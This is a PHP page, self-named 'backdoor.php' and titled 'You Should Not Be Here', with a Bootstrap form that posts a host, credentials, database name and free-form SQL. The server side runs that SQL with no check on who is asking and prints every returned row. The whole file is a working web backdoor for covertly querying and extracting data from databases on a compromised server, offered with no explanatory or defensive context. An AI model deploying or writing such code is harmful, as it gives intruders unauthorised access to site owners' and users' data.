<?php
    error_reporting(E_ALL);
    if($_SERVER['REQUEST_METHOD'] == 'POST') {
        $host = $_POST['host'];
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        $db   = $_POST['db'];
        $sql  = $_POST['sql'];
        
        try {
            $conn = new mysqli($host, $user, $pass, $db);
            
            if(!$conn){
                echo "not connected";
                die();
            }
            
            $res = $conn->query($sql);
           
            while($fetched = $res->fetch_assoc()) {
                
                print_r($fetched);
            }

        } catch(Exception $e) {
            echo $e->getMessage();
        }

        die();
    }
?>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">

    <title>You Should Not Be Here</title>
  </head>
  <body>
    
    <div class="container">
        <div class="row" style="margin-top: 40px;">
           
            <div class="col-md-6">
                <h2>Query</h2>
                <div class="form-group">
                    <label>Host</label>
                    <input type="text" class="form-control" id="host">
                </div>
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" class="form-control" id="user">
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="text" class="form-control" id="pass">
                </div>
                <div class="form-group">
                    <label>Database</label>
                    <input type="text" class="form-control" id="db">
                </div>
                <div class="form-group">
                    <label>Query</label>
                    <textarea class="form-control" id="sql"></textarea>
                </div>
                <div class="form-group">
                    <button id="btn-query" class="btn btn-primary">Query!</button>
                </div>
            </div>

            <div class="col-md-6">
                <h2>Result</h2>
                <textarea id="result" class="form-control" rows=20 disabled></textarea>
            </div>

        </div>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.min.js" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
    <script type="text/javascript">
        $(function() {
            
            
            $("#btn-query").click(function() {
                var host = $("#host").val();
            var user = $("#user").val();
            var pass = $("#pass").val();
            var db = $("#db").val();
            var sql = $("#sql").val();
                $.ajax({
                    url: "backdoor.php",
                    type: "POST",
                    data: {
                        host: host,
                        user: user,
                        pass: pass,
                        db: db,
                        sql: sql
                    }
                }).done(function(msg) {
                    $("#result").val(msg);
                });
            });
        });
    </script>
  </body>
</html>